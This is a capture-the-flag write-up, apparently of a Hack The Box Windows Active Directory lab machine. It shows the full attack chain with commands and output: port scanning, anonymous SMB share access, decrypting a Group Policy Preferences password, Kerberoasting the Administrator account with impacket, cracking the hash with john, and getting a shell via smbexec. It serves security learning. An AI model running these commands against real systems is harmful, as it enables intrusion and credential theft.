# Active

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 5000 10.129.192.152
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-05 02:08 EDT
Nmap scan report for 10.129.192.152
Host is up (0.014s latency).
Not shown: 60173 closed tcp ports (conn-refused), 5341 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5722/tcp  open  msdfsr
9389/tcp  open  adws
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49157/tcp open  unknown
49158/tcp open  unknown
49165/tcp open  unknown
49170/tcp open  unknown
49172/tcp open  unknown
```

Since this is an AD machine, we can start with basic enumeration of SMB shares, Kerberos and LDAP.

### SMB Enum

Checking SMB shares via `smbmap` reveals there is one share available:

```
$ smbmap -H 10.129.192.152                                  
[+] IP: 10.129.192.152:445      Name: 10.129.192.152                                    
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    NO ACCESS       Remote IPC
        NETLOGON                                                NO ACCESS       Logon server share 
        Replication                                             READ ONLY
        SYSVOL                                                  NO ACCESS       Logon server share 
        Users                                                   NO ACCESS
```

We can use `smbclient` to login and view the files:

```
$ smbclient -U "" //10.129.192.152/Replication -N
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Jul 21 06:37:44 2018
  ..                                  D        0  Sat Jul 21 06:37:44 2018
  active.htb                          D        0  Sat Jul 21 06:37:44 2018

                10459647 blocks of size 4096. 5186557 blocks available
```

We can download all the files present within the machine using these commands, and I saw an interesting file:

{% code overflow="wrap" %}
```
mask ""
recurse ON
prompt OFF
mget *
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\Groups.xml of size 533 as active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml (16.8 KiloBytes/sec) (average 23.8 KiloBytes/sec)
```
{% endcode %}

Within this file, we can find an encrypted pasword:

{% code overflow="wrap" %}
```markup
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
</Groups>
```
{% endcode %}

This was a GPO password, and it can be decrypted using `gpp-decrypt` since we have the key and the password.

{% embed url="https://www.kali.org/tools/gpp-decrypt/" %}

```
$ gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
GPPstillStandingStrong2k18
```

Now, we have a password of a service account to use. With this, we can read the `C:\Users` directory and find the flag in the Desktop of `SVC_TGS` user.&#x20;

```
$ smbmap -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18' -H 10.129.192.152 
[+] IP: 10.129.192.152:445      Name: 10.129.192.152                                    
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    NO ACCESS       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share 
        Replication                                             READ ONLY
        SYSVOL                                                  READ ONLY       Logon server share 
        Users                                                   READ ONLY
```

## Privilege Escalation

### Kerberoasting

We have access to a service account here, and it is for the Ticket Granting Service. As such, we can attempt to do Kerberoasting.&#x20;

```
$ impacket-GetUserSPNs -request -dc-ip 10.129.192.152 active.htb/SVC_TGS -outputfile hashes.kerberoast 
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

Password:
ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 15:06:40.351723  2023-05-05 02:07:43.878117             
```

So we can use this to harvest the TGS tickets for the administrator. Then, we can crack the hash (because user passwords are used to encrypt the tickets).

```
$ john --wordlist=/usr/share/wordlists/rockyou.txt hashes.kerberoast 
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Ticketmaster1968 (?)     
1g 0:00:00:04 DONE (2023-05-05 02:21) 0.2277g/s 2400Kp/s 2400Kc/s 2400KC/s Tiffani1432..Thrash1
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Then, we can get a shell via `smbexec.py`.

<figure><img src="../../../.gitbook/assets/image (989).png" alt=""><figcaption></figcaption></figure>

Rooted!
